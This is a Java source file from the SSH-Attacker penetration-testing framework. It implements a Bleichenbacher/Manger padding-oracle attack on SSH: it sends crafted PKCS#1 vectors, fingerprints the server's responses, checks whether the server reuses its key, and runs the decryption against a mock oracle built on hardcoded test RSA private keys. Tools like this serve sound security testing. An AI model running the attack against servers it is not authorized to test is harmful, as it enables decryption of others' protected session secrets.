/*
 * SSH-Attacker - A Modular Penetration Testing Framework for SSH
 *
 * Copyright 2014-2022 Ruhr University Bochum, Paderborn University, and Hackmanit GmbH
 *
 * Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.sshattacker.attacks.impl;

import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;

import de.rub.nds.modifiablevariable.util.ArrayConverter;
import de.rub.nds.sshattacker.attacks.config.BleichenbacherCommandConfig;
import de.rub.nds.sshattacker.attacks.exception.OracleUnstableException;
import de.rub.nds.sshattacker.attacks.general.KeyFetcher;
import de.rub.nds.sshattacker.attacks.general.ParallelExecutor;
import de.rub.nds.sshattacker.attacks.general.Vector;
import de.rub.nds.sshattacker.attacks.padding.VectorResponse;
import de.rub.nds.sshattacker.attacks.padding.vector.FingerprintTaskVectorPair;
import de.rub.nds.sshattacker.attacks.pkcs1.*;
import de.rub.nds.sshattacker.attacks.pkcs1.oracles.Ssh1MockOracle;
import de.rub.nds.sshattacker.attacks.response.EqualityError;
import de.rub.nds.sshattacker.attacks.response.EqualityErrorTranslator;
import de.rub.nds.sshattacker.attacks.response.FingerPrintChecker;
import de.rub.nds.sshattacker.attacks.response.ResponseFingerprint;
import de.rub.nds.sshattacker.attacks.task.FingerPrintTask;
import de.rub.nds.sshattacker.attacks.task.SshTask;
import de.rub.nds.sshattacker.core.config.Config;
import de.rub.nds.sshattacker.core.constants.KeyExchangeAlgorithm;
import de.rub.nds.sshattacker.core.crypto.keys.CustomRsaPrivateKey;
import de.rub.nds.sshattacker.core.crypto.keys.CustomRsaPublicKey;
import de.rub.nds.sshattacker.core.exceptions.ConfigurationException;
import de.rub.nds.sshattacker.core.state.State;
import java.math.BigInteger;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.interfaces.RSAPublicKey;
import java.util.ArrayList;
import java.util.Collections;
import java.util.LinkedList;
import java.util.List;
import javax.crypto.NoSuchPaddingException;
import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Sends differently formatted PKCS#1 v2.x messages to the SSH server and observes the server
 * responses. In case there are differences in the server responses, it is very likely that it is
 * possible to execute Manger's attack.
 */
public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig> {

    private static final Logger LOGGER = LogManager.getLogger();

    private final Config sshConfig;

    private boolean increasingTimeout = true;

    private long additionalTimeout = 1000;

    private long additionalTcpTimeout = 5000;

    private List<VectorResponse> fullResponseMap;

    private EqualityError resultError;

    private final ParallelExecutor executor;

    private boolean erroneousScans = false;

    private KeyExchangeAlgorithm keyExchangeAlgorithm;

    private List<RSAPublicKey> publicKeys = new ArrayList<>();
    private RSAPublicKey serverPublicKey, hostPublicKey;

    /**
     * @param bleichenbacherConfig Manger attack config
     * @param baseConfig Base config
     */
    public BleichenbacherAttacker(
            BleichenbacherCommandConfig bleichenbacherConfig, Config baseConfig) {
        this(bleichenbacherConfig, baseConfig, new ParallelExecutor(1, 3));
    }

    /**
     * @param bleichenbacherCommandConfig Manger attack config
     * @param baseConfig Base config
     * @param executor Executor
     */
    public BleichenbacherAttacker(
            BleichenbacherCommandConfig bleichenbacherCommandConfig,
            Config baseConfig,
            ParallelExecutor executor) {
        super(bleichenbacherCommandConfig, baseConfig);
        sshConfig = getSshConfig();
        setKeyExchangeAlgorithm();
        fullResponseMap = new ArrayList<>();
        this.executor = executor;
    }

    /**
     * @return If the server is vulnerable to Bleichenbacher's attack or not
     */
    @Override
    public Boolean isVulnerable() {
        CONSOLE.info(
                "A server is considered vulnerable to this attack if it reuses it's host key and "
                        + "responds differently to the test vectors.");
        CONSOLE.info(
                "A server is considered secure if it does not reuse the host key or"
                        + " if it does not have Manger's oracle.");

        RSAPublicKey publicKey = getServerPublicKey();
        if (publicKey == null) {
            LOGGER.fatal("Could not retrieve PublicKey from Server - is the Server running?");
            throw new OracleUnstableException("Fatal Extraction error");
        }

        boolean reusesTransientPublicKey;
        if (!isTransientKeyReused(publicKey)) {
            CONSOLE.info("Server does not reuse the transient public key, it should be safe.");
            reusesTransientPublicKey = false;
        } else {
            CONSOLE.info("Server reuses transient public key.");
            reusesTransientPublicKey = true;
        }

        return hasOracle() & reusesTransientPublicKey;
    }

    /**
     * Checks if the server has Bleichenbacher's oracle without checking if it reuses the transient
     * public key
     *
     * @return If the server has Bleichenbacher's oracle or not
     */
    public boolean hasOracle() {
        CONSOLE.info(
                "A server has Manger's Oracle if it responds differently to the test vectors.");

        RSAPublicKey publicKey = getServerPublicKey();
        if (publicKey == null) {
            LOGGER.fatal("Could not retrieve PublicKey from Server - is the Server running?");
            throw new OracleUnstableException("Fatal Extraction error");
        }

        EqualityError referenceError;
        fullResponseMap = new LinkedList<>();
        for (int i = 0; i < config.getNumberOfIterations(); i++) {
            List<VectorResponse> responseMap = createVectorResponseList(publicKey, true);
            this.fullResponseMap.addAll(responseMap);
        }

        referenceError = getEqualityError(fullResponseMap);
        if (referenceError != EqualityError.NONE) {
            CONSOLE.info(
                    "Found a behavior difference within the responses. The server has Manger's oracle.");
        } else {
            CONSOLE.info(
                    "Found no behavior difference within the responses. The server is very likely to not have Manger's oracle.");
        }

        CONSOLE.info(EqualityErrorTranslator.translation(referenceError));
        if (referenceError != EqualityError.NONE
                || LOGGER.getLevel().isMoreSpecificThan(Level.INFO)) {
            LOGGER.debug("-------------(Not Grouped)-----------------");
            for (VectorResponse vectorResponse : fullResponseMap) {
                LOGGER.debug(vectorResponse.toString());
            }
        }

        resultError = referenceError;
        return referenceError != EqualityError.NONE;
    }

    /**
     * @return Response vector list
     */
    private List<VectorResponse> createVectorResponseList(RSAPublicKey publicKey, boolean plain) {
        List<SshTask> taskList = new LinkedList<>();
        List<FingerprintTaskVectorPair<?>> stateVectorPairList = new LinkedList<>();

        List<Pkcs1Vector> vectors;
        if (plain) {
            vectors =
                    Pkcs1VectorGenerator.generatePlainPkcs1Vectors(
                            publicKey.getModulus().bitLength(), getHashLength(), getHashInstance());
        } else {
            vectors =
                    Pkcs1VectorGenerator.generatePkcs1Vectors(
                            publicKey, getHashLength(), getHashInstance());
        }

        for (Pkcs1Vector vector : vectors) {

            State state;
            if (plain) {
                state =
                        new State(
                                sshConfig,
                                MangerWorkflowGenerator.generateDynamicWorkflow(
                                        sshConfig, vector.getPlainValue()));
            } else {
                state =
                        new State(
                                sshConfig,
                                MangerWorkflowGenerator.generateWorkflow(
                                        sshConfig, vector.getEncryptedValue()));
            }

            FingerPrintTask fingerPrintTask =
                    new FingerPrintTask(
                            state,
                            additionalTimeout,
                            increasingTimeout,
                            executor.getReexecutions(),
                            additionalTcpTimeout);

            taskList.add(fingerPrintTask);
            stateVectorPairList.add(new FingerprintTaskVectorPair<>(fingerPrintTask, vector));
        }
        List<VectorResponse> tempResponseVectorList = new LinkedList<>();
        executor.bulkExecuteTasks(taskList);
        for (FingerprintTaskVectorPair<?> pair : stateVectorPairList) {
            ResponseFingerprint fingerprint;
            if (pair.getFingerPrintTask().isHasError()) {
                erroneousScans = true;
                LOGGER.warn("Could not extract fingerprint for " + pair);
            } else {
                fingerprint = pair.getFingerPrintTask().getFingerprint();
                tempResponseVectorList.add(new VectorResponse(pair.getVector(), fingerprint));
            }
        }
        return tempResponseVectorList;
    }

    /**
     * This assumes that the responseVectorList only contains comparable vectors
     *
     * @param responseVectorList Response vectors
     * @return Type of EqualityError or EqualityError.NONE if there was none
     */
    public EqualityError getEqualityError(List<VectorResponse> responseVectorList) {

        for (VectorResponse responseOne : responseVectorList) {
            for (VectorResponse responseTwo : responseVectorList) {
                if (responseOne == responseTwo) {
                    continue;
                }
                EqualityError error =
                        FingerPrintChecker.checkEquality(
                                responseOne.getFingerprint(), responseTwo.getFingerprint());
                if (error != EqualityError.NONE) {
                    CONSOLE.info("Found an EqualityError: " + error);
                    LOGGER.debug("Fingerprint1: " + responseOne.getFingerprint().toString());
                    LOGGER.debug("Fingerprint2: " + responseTwo.getFingerprint().toString());
                    return error;
                }
            }
        }
        return EqualityError.NONE;
    }

    /**
     * Fetches the transient public key from a key exchange. Note that multiple calls to this method
     * when connected to the same server can yield different keys.
     *
     * @return Transient public key
     */
    private RSAPublicKey getServerPublicKey() {
        if (serverPublicKey == null) {
            if (publicKeys.isEmpty()) {
                getPublicKeys();
                serverPublicKey = publicKeys.get(0);
            } else {
                serverPublicKey = publicKeys.get(0);
            }
        }
        return serverPublicKey;
    }

    private RSAPublicKey getHostPublicKey() {
        if (hostPublicKey == null) {
            if (publicKeys.isEmpty()) {
                getPublicKeys();
                hostPublicKey = publicKeys.get(1);
            } else {
                hostPublicKey = publicKeys.get(1);
            }
        }
        return hostPublicKey;
    }

    private void getPublicKeys() {
        List<RSAPublicKey> fetchedRsaSsh1Keys = KeyFetcher.fetchRsaSsh1Keys(sshConfig);
        if (fetchedRsaSsh1Keys.isEmpty()) {
            LOGGER.info("Could not retrieve PublicKey from Server - is the Server running?");
            return;
        }
        publicKeys.clear();
        publicKeys.addAll(fetchedRsaSsh1Keys);
    }

    /** Checks if the server re-uses its RSA transient public key */
    public boolean isTransientKeyReused() {
        RSAPublicKey transientKey1 = getServerPublicKey();
        RSAPublicKey transientKey2 = getServerPublicKey();
        if (transientKey1 == null || transientKey2 == null) {
            LOGGER.fatal("Could not retrieve server transient public key, is the server running?");
            throw new OracleUnstableException("Fatal Extraction error");
        } else {
            return comparePublicKeys(transientKey1, transientKey2);
        }
    }

    /** Checks if the server re-uses its RSA transient public key */
    private boolean isTransientKeyReused(RSAPublicKey transientKey1) {
        RSAPublicKey transientKey2 = getServerPublicKey();
        if (transientKey1 == null || transientKey2 == null) {
            LOGGER.fatal("Could not retrieve server transient public key, is the server running?");
            throw new OracleUnstableException("Fatal Extraction error");
        } else {
            return comparePublicKeys(transientKey1, transientKey2);
        }
    }

    /** Compares moduli and public exponents of public keys to check if they are equal */
    private boolean comparePublicKeys(RSAPublicKey transientKey1, RSAPublicKey transientKey2) {
        return transientKey1.getPublicExponent().equals(transientKey2.getPublicExponent())
                && transientKey1.getModulus().equals(transientKey2.getModulus());
    }

    @Override
    public void executeAttack() {

        /*if (!isVulnerable()) {
            LOGGER.warn("The server is not vulnerable to Manger's attack");
            return;
        }
        RSAPublicKey publicKey = getServerPublicKey();
        if (publicKey == null) {
            LOGGER.info("Could not retrieve PublicKey from Server - is the Server running?");
            return;
        }

        if (config.getEncryptedSecret() == null) {
            throw new ConfigurationException("The encrypted secret must be set to be decrypted.");
        }

        if (config.getKexAlgorithm() == null) {
            throw new ConfigurationException("The key exchange algorithm must be set.");
        }

        LOGGER.info(
                String.format(
                        "Fetched server public key with exponent %s and modulus: %s",
                        publicKey.getPublicExponent().toString(16),
                        publicKey.getModulus().toString(16)));
        byte[] encryptedSecret = ArrayConverter.hexStringToByteArray(config.getEncryptedSecret());
                if ((encryptedSecret.length * Byte.SIZE) != publicKey.getModulus().bitLength()) {
            throw new ConfigurationException(
                    "The length of the encrypted secret "
                            + "is not equal to the public key length. Have you selected the correct value?");
        }*/

        byte[] encryptedSecret = ArrayConverter.hexStringToByteArray(config.getEncryptedSecret());

        CustomRsaPrivateKey hostPrivatKey =
                new CustomRsaPrivateKey(
                        new BigInteger(
                                "7AAB5898AEE7C451A2A90B9DE04EC947656FAB69460FF68E1E278EA1841D"
                                        + "A22B39CA4A4FA7CEA1B8EDCB7224C38A1659D1226D2E07AF9A7C62A305AC"
                                        + "9DEC042FBC290443B23E24C64765DE1AD58777A522BF102B1BCC5536D794"
                                        + "62BCBE6DB8E91CD9CF6F98F62E5031BFAA9E51C93ED900579A39C26CBB64"
                                        + "CF7E6F998513E20B4B2A4DD36D4F6F074A0FDB04232FA6EDAB89A1B32BA5"
                                        + "2214696BDA66C4518A73F92807DD088AB11263519885A0CD6A42B6D9EAE9"
                                        + "EBD13241EDC4EB7205AE838A5EF7AE280D36410057B38ED05CEBA75F92AC"
                                        + "DF40226164BB3A0C4312B65A8C2FBA85CDB7CC5F77F53C45F64409AFC460"
                                        + "210C8EE4DAB818F009172387ED00E141",
                                16),
                        new BigInteger(
                                "00D9F6BFFAB8BC79C6E9AB6C3D4593F561CC93B41A70B9A750045ED0AC09"
                                        + "6EF4A6A8C7B2AAA4F44459481319AE956934BF9D5C5AD7C004ADE0B81E43"
                                        + "75FD1DF8797DF6F3CA130ED8A2A9B6E94467A05D97A0F8380A4CBB75FC5E"
                                        + "5C303433B61750063D3801D5C90658ACAEE140B09F95A0FD8886EFAE16EA"
                                        + "B779DF82E6A12C1BE011FECB417C788B72C42948AB54CCE1E8119CFB78E1"
                                        + "3B06090CEBF6D3806854FE09F03B20BA92505058EC64C44F0B4DA0BAE71D"
                                        + "52EDA11AB67F4B54D9FCEFE1FACEB520D595FFA33502FB91423EBD972F26"
                                        + "150715CB0E648F715E6E5E8FC9D8FA55E9DE0652CF85D7928B235486F54A"
                                        + "3F3EE64B04888B898864B08200A9E22909",
                                16));

        CustomRsaPublicKey hostPublicKey =
                new CustomRsaPublicKey(
                        new BigInteger("010001", 16),
                        new BigInteger(
                                "00D9F6BFFAB8BC79C6E9AB6C3D4593F561CC93B41A70B9A750045ED0AC09"
                                        + "6EF4A6A8C7B2AAA4F44459481319AE956934BF9D5C5AD7C004ADE0B81E43"
                                        + "75FD1DF8797DF6F3CA130ED8A2A9B6E94467A05D97A0F8380A4CBB75FC5E"
                                        + "5C303433B61750063D3801D5C90658ACAEE140B09F95A0FD8886EFAE16EA"
                                        + "B779DF82E6A12C1BE011FECB417C788B72C42948AB54CCE1E8119CFB78E1"
                                        + "3B06090CEBF6D3806854FE09F03B20BA92505058EC64C44F0B4DA0BAE71D"
                                        + "52EDA11AB67F4B54D9FCEFE1FACEB520D595FFA33502FB91423EBD972F26"
                                        + "150715CB0E648F715E6E5E8FC9D8FA55E9DE0652CF85D7928B235486F54A"
                                        + "3F3EE64B04888B898864B08200A9E22909",
                                16));

        CustomRsaPrivateKey serverPrivateKey =
                new CustomRsaPrivateKey(
                        new BigInteger(
                                "64F3D28624C63EC5E0A9751FDC4B2D"
                                        + "ADC715F0DDA9D49EF91B4C5AA03483"
                                        + "570BA8AA01151B704335A3219E7D22"
                                        + "2FDB9777DA68F8DF8B5CDB5DB9B0C3"
                                        + "99CF0334044E6ED09B40E754809429"
                                        + "F6C387B7AC7BA00ECFE7AFE4D41499"
                                        + "B2F341FBB0496C52CBE5EB1F7E64F4"
                                        + "BF21F72B64EE0B478EAB6A0008E07A"
                                        + "E2F52960703D0EB9",
                                16),
                        new BigInteger(
                                "00C25E6978A2B8FE2C6228024BD5D0"
                                        + "F3239DDDDECCDF156AEF9D3F7F56AF"
                                        + "8443C510A03C66779363C33082D04D"
                                        + "23648B308AE0BE07A1451C8BFF0B97"
                                        + "DCA43E5703D66B8C04BF46DDBC79A7"
                                        + "7228179E5B246433098BF8271CCE66"
                                        + "C5E4CB3A9E2ECEE52BB07C33F92893"
                                        + "A5D5B6F163BE6FBC1E8E66E4666866"
                                        + "871890105EFFE1193F",
                                16));

        CustomRsaPublicKey serverPublicKey =
                new CustomRsaPublicKey(
                        new BigInteger("010001", 16),
                        new BigInteger(
                                "00C25E6978A2B8FE2C6228024BD5D0"
                                        + "F3239DDDDECCDF156AEF9D3F7F56AF"
                                        + "8443C510A03C66779363C33082D04D"
                                        + "23648B308AE0BE07A1451C8BFF0B97"
                                        + "DCA43E5703D66B8C04BF46DDBC79A7"
                                        + "7228179E5B246433098BF8271CCE66"
                                        + "C5E4CB3A9E2ECEE52BB07C33F92893"
                                        + "A5D5B6F163BE6FBC1E8E66E4666866"
                                        + "871890105EFFE1193F",
                                16));

        try {
            Ssh1MockOracle oracle =
                    new Ssh1MockOracle(
                            hostPublicKey, hostPrivatKey, serverPublicKey, serverPrivateKey);
            Bleichenbacher attacker =
                    new Bleichenbacher(encryptedSecret, oracle, hostPublicKey, serverPublicKey);
            attacker.attack();
            BigInteger solution = attacker.getSolution();
            /*            BigInteger secret =
            OaepConverter.decodeSolution(
                    solution,
                    getHashInstance(),
                    ((RSAPublicKey) oracle.getPublicKey()).getModulus().bitLength()
                            / Byte.SIZE);*/

            CONSOLE.info("Encoded Solution: " + solution);
            // CONSOLE.info("Decoded Secret: " + secret);
        } catch (NoSuchPaddingException e) {
            throw new RuntimeException(e);
        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException(e);
        } catch (InvalidKeyException e) {
            throw new RuntimeException(e);
        }

        /*        RealDirectMessagePkcs1Oracle oracle =
                new RealDirectMessagePkcs1Oracle(
                        publicKey, getSshConfig(), extractValidFingerprint(publicKey), null);
        Bleichenbacher attacker = new Bleichenbacher(encryptedSecret, oracle);
        attacker.attack();
        BigInteger solution = attacker.getSolution();
        BigInteger secret =
                OaepConverter.decodeSolution(
                        solution,
                        getHashInstance(),
                        ((RSAPublicKey) oracle.getPublicKey()).getModulus().bitLength()
                                / Byte.SIZE);*/

        /*CONSOLE.info("Encoded Solution: " + solution);
        CONSOLE.info("Decoded Secret: " + secret);*/
    }

    private ResponseFingerprint extractValidFingerprint(RSAPublicKey publicKey) {
        Pkcs1Vector vector =
                Pkcs1VectorGenerator.generateCorrectFirstBytePkcs1Vector(
                        publicKey, getHashLength(), getHashInstance());
        State state =
                new State(
                        sshConfig,
                        MangerWorkflowGenerator.generateWorkflow(
                                sshConfig, vector.getEncryptedValue()));
        FingerPrintTask fingerPrintTask =
                new FingerPrintTask(
                        state,
                        additionalTimeout,
                        increasingTimeout,
                        executor.getReexecutions(),
                        additionalTcpTimeout);
        FingerprintTaskVectorPair<? extends Vector> stateVectorPair =
                new FingerprintTaskVectorPair<>(fingerPrintTask, vector);

        executor.bulkExecuteTasks(fingerPrintTask);
        ResponseFingerprint fingerprint = null;
        if (stateVectorPair.getFingerPrintTask().isHasError()) {
            LOGGER.warn("Could not extract fingerprint for " + stateVectorPair);
        } else {
            fingerprint = fingerPrintTask.getFingerprint();
        }
        return fingerprint;
    }

    private int getHashLength() {
        switch (keyExchangeAlgorithm) {
            case RSA2048_SHA256:
                return 256;
            case RSA1024_SHA1:
                return 160;
            default:
                return 0;
        }
    }

    private String getHashInstance() {
        switch (keyExchangeAlgorithm) {
            case RSA2048_SHA256:
                return "SHA-256";
            case RSA1024_SHA1:
                return "SHA-1";
            default:
                return "";
        }
    }

    private void setKeyExchangeAlgorithm() {
        if (config.getKexAlgorithm() == null) {
            throw new ConfigurationException("The key exchange algorithm must be set.");
        } else {
            if (config.getKexAlgorithm().equals("rsa2048-sha256")) {
                keyExchangeAlgorithm = KeyExchangeAlgorithm.RSA2048_SHA256;

            } else if (config.getKexAlgorithm().equals("rsa1024-sha1")) {
                keyExchangeAlgorithm = KeyExchangeAlgorithm.RSA1024_SHA1;
            } else {
                throw new ConfigurationException(
                        "Unknown key exchange algorithm, did you mistype it? "
                                + "Options are rsa2048-sha256 and rsa1024-sha1");
            }
        }

        // Set only supported key exchange algorithm to the one specified by the user
        sshConfig.setClientSupportedKeyExchangeAlgorithms(
                new ArrayList<>(Collections.singleton(keyExchangeAlgorithm)));

        CONSOLE.info("Set key exchange algorithm to: " + keyExchangeAlgorithm);
    }

    public EqualityError getResultError() {
        return resultError;
    }

    public List<VectorResponse> getResponseMapList() {
        return fullResponseMap;
    }

    public boolean isErrornousScans() {
        return erroneousScans;
    }

    public boolean isIncreasingTimeout() {
        return increasingTimeout;
    }

    public void setIncreasingTimeout(boolean increasingTimeout) {
        this.increasingTimeout = increasingTimeout;
    }

    public long getAdditionalTimeout() {
        return additionalTimeout;
    }

    public void setAdditionalTimeout(long additionalTimeout) {
        this.additionalTimeout = additionalTimeout;
    }

    public long getAdditionalTcpTimeout() {
        return additionalTcpTimeout;
    }

    public void setAdditionalTcpTimeout(long additionalTcpTimeout) {
        this.additionalTcpTimeout = additionalTcpTimeout;
    }
}
